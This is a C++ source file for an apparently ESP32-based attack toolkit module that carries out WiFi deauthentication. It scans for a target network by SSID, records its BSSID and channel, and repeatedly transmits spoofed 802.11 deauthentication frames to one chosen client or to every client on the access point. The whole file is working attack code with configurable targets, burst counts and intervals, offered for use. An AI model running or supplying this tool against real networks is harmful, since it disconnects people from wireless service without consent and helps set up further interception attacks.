/*
 * DeauthAttack.cpp
 * 
 * Implementation of the WiFi Deauthentication Attack module
 */

#include "DeauthAttack.h"
#include <WiFi.h>

DeauthAttack::DeauthAttack() : Attack(ATTACK_TYPE_DEAUTH, "WiFi Deauthentication") {
  // Initialize parameters with defaults
  targetSSID = "";
  memset(targetBSSID, 0, 6);
  memset(targetMAC, 0, 6);
  channel = 1;
  
  attackAllClients = true;
  framesPerBurst = 5;
  attackInterval = DEFAULT_DEAUTH_INTERVAL;
  
  apFound = false;
}

DeauthAttack::~DeauthAttack() {
  // Clean up
  stop();
}

bool DeauthAttack::start(unsigned long duration) {
  // Don't start if already running
  if (status == ATTACK_STATUS_RUNNING) {
    return true;
  }
  
  // Reset error message
  errorMessage = "";
  
  // Check if we have a target
  if (targetSSID.length() == 0 && !apFound) {
    errorMessage = "No target network specified";
    status = ATTACK_STATUS_ERROR;
    return false;
  }
  
  // If we have a target SSID but haven't found the AP yet, scan for it
  if (!apFound && targetSSID.length() > 0) {
    if (!scanForTargetAP()) {
      errorMessage = "Target AP not found";
      status = ATTACK_STATUS_ERROR;
      return false;
    }
  }
  
  // Initialize WiFi in promiscuous mode
  WiFi.disconnect();
  WiFi.mode(WIFI_STA);
  
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_STA);
  esp_wifi_start();
  
  // Set WiFi channel to match target AP
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  
  // Enable promiscuous mode
  esp_wifi_set_promiscuous(true);
  
  Serial.println("WiFi Deauthentication Attack started");
  Serial.print("Target AP: ");
  Serial.print(targetSSID);
  Serial.print(" (");
  printMACAddress(targetBSSID);
  Serial.print(") on channel ");
  Serial.println(channel);
  
  if (!attackAllClients) {
    Serial.print("Target client MAC: ");
    printMACAddress(targetMAC);
  } else {
    Serial.println("Attacking all clients connected to the AP");
  }
  
  // Set start time and duration
  startTime = millis();
  this->duration = duration;
  lastActionTime = 0;
  
  // Update status
  status = ATTACK_STATUS_RUNNING;
  
  return true;
}

bool DeauthAttack::stop() {
  // Only stop if running
  if (status != ATTACK_STATUS_RUNNING) {
    return true;
  }
  
  // Disable promiscuous mode
  esp_wifi_set_promiscuous(false);
  
  // Restore WiFi
  WiFi.disconnect();
  
  Serial.println("WiFi Deauthentication Attack stopped");
  
  // Update status
  status = ATTACK_STATUS_STOPPING;
  
  return true;
}

void DeauthAttack::update() {
  // Call base class update
  Attack::update();
  
  // Only perform actions if running
  if (status == ATTACK_STATUS_RUNNING) {
    unsigned long currentMillis = millis();
    
    // Send deauth frames at regular intervals
    if (currentMillis - lastActionTime >= attackInterval) {
      lastActionTime = currentMillis;
      
      if (attackAllClients) {
        // Broadcast deauth (affects all clients)
        uint8_t broadcastMAC[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        
        Serial.println("Sending broadcast deauthentication frames...");
        
        for (int i = 0; i < framesPerBurst; i++) {
          sendDeauthFrame(broadcastMAC, targetBSSID);
          delay(5);
        }
      } else {
        // Targeted deauth (affects only specific client)
        Serial.println("Sending targeted deauthentication frames...");
        
        for (int i = 0; i < framesPerBurst; i++) {
          sendDeauthFrame(targetMAC, targetBSSID);
          delay(5);
        }
      }
    }
  }
}

bool DeauthAttack::setParameter(const String& name, const String& value) {
  if (name == "ssid") {
    targetSSID = value;
    apFound = false;
    return true;
  }
  else if (name == "bssid") {
    if (macAddressFromString(value, targetBSSID)) {
      return true;
    } else {
      errorMessage = "Invalid MAC address format";
      return false;
    }
  }
  else if (name == "channel") {
    int ch = value.toInt();
    if (ch >= 1 && ch <= 14) {
      channel = ch;
      return true;
    } else {
      errorMessage = "Invalid channel (must be 1-14)";
      return false;
    }
  }
  else if (name == "mac") {
    if (macAddressFromString(value, targetMAC)) {
      return true;
    } else {
      errorMessage = "Invalid MAC address format";
      return false;
    }
  }
  else if (name == "all") {
    if (value == "true" || value == "1") {
      attackAllClients = true;
      return true;
    } else if (value == "false" || value == "0") {
      attackAllClients = false;
      return true;
    } else {
      errorMessage = "Invalid value (use true/false or 1/0)";
      return false;
    }
  }
  else if (name == "frames") {
    int frames = value.toInt();
    if (frames > 0 && frames <= 50) {
      framesPerBurst = frames;
      return true;
    } else {
      errorMessage = "Invalid frame count (must be 1-50)";
      return false;
    }
  }
  else if (name == "interval") {
    int interval = value.toInt();
    if (interval >= 100) {
      attackInterval = interval;
      return true;
    } else {
      errorMessage = "Invalid interval (must be >= 100ms)";
      return false;
    }
  }
  
  errorMessage = "Unknown parameter: " + name;
  return false;
}

String DeauthAttack::getParameter(const String& name) const {
  if (name == "ssid") {
    return targetSSID;
  }
  else if (name == "bssid") {
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             targetBSSID[0], targetBSSID[1], targetBSSID[2],
             targetBSSID[3], targetBSSID[4], targetBSSID[5]);
    return String(macStr);
  }
  else if (name == "channel") {
    return String(channel);
  }
  else if (name == "mac") {
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             targetMAC[0], targetMAC[1], targetMAC[2],
             targetMAC[3], targetMAC[4], targetMAC[5]);
    return String(macStr);
  }
  else if (name == "all") {
    return attackAllClients ? "true" : "false";
  }
  else if (name == "frames") {
    return String(framesPerBurst);
  }
  else if (name == "interval") {
    return String(attackInterval);
  }
  
  return "";
}

String DeauthAttack::getAllParameters() const {
  String params = "{";
  params += "\"ssid\":\"" + targetSSID + "\",";
  
  char macStr[18];
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
           targetBSSID[0], targetBSSID[1], targetBSSID[2],
           targetBSSID[3], targetBSSID[4], targetBSSID[5]);
  params += "\"bssid\":\"" + String(macStr) + "\",";
  
  params += "\"channel\":" + String(channel) + ",";
  
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
           targetMAC[0], targetMAC[1], targetMAC[2],
           targetMAC[3], targetMAC[4], targetMAC[5]);
  params += "\"mac\":\"" + String(macStr) + "\",";
  
  params += "\"all\":" + String(attackAllClients ? "true" : "false") + ",";
  params += "\"frames\":" + String(framesPerBurst) + ",";
  params += "\"interval\":" + String(attackInterval);
  params += "}";
  
  return params;
}

bool DeauthAttack::scanForTargetAP() {
  Serial.println("Scanning for networks...");
  
  WiFi.disconnect();
  WiFi.mode(WIFI_STA);
  
  int n = WiFi.scanNetworks();
  Serial.print(n);
  Serial.println(" networks found");
  
  for (int i = 0; i < n; ++i) {
    // Check if this is our target network
    if (WiFi.SSID(i) == targetSSID) {
      apFound = true;
      channel = WiFi.channel(i);
      
      // Get AP MAC address
      uint8_t* bssid = WiFi.BSSID(i);
      memcpy(targetBSSID, bssid, 6);
      
      Serial.print("Found target network: ");
      Serial.print(WiFi.SSID(i));
      Serial.print(" (");
      printMACAddress(targetBSSID);
      Serial.print(") on channel ");
      Serial.println(channel);
      
      break;
    }
  }
  
  WiFi.scanDelete();
  
  return apFound;
}

void DeauthAttack::sendDeauthFrame(uint8_t* clientMAC, uint8_t* apMAC) {
  // Create a copy of the template
  uint8_t deauthFrame[sizeof(deauthFrameTemplate)];
  memcpy(deauthFrame, deauthFrameTemplate, sizeof(deauthFrameTemplate));
  
  // Fill in the addresses
  memcpy(&deauthFrame[4], clientMAC, 6);  // Destination: Client MAC
  memcpy(&deauthFrame[10], apMAC, 6);     // Source: AP MAC
  memcpy(&deauthFrame[16], apMAC, 6);     // BSSID: AP MAC
  
  // Send the frame
  esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
  
  // Now send in the other direction (AP to client)
  memcpy(&deauthFrame[4], apMAC, 6);      // Destination: AP MAC
  memcpy(&deauthFrame[10], clientMAC, 6); // Source: Client MAC
  memcpy(&deauthFrame[16], apMAC, 6);     // BSSID: AP MAC
  
  // Send the frame
  esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
}

void DeauthAttack::printMACAddress(const uint8_t* mac) {
  char macStr[18];
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  Serial.print(macStr);
}

bool DeauthAttack::macAddressFromString(const String& macStr, uint8_t* mac) {
  // Check if the string is a valid MAC address
  if (macStr.length() != 17) {
    return false;
  }
  
  // Parse the MAC address
  int values[6];
  int result = sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x",
                     &values[0], &values[1], &values[2],
                     &values[3], &values[4], &values[5]);
  
  if (result != 6) {
    return false;
  }
  
  // Convert to bytes
  for (int i = 0; i < 6; i++) {
    mac[i] = (uint8_t)values[i];
  }
  
  return true;
}
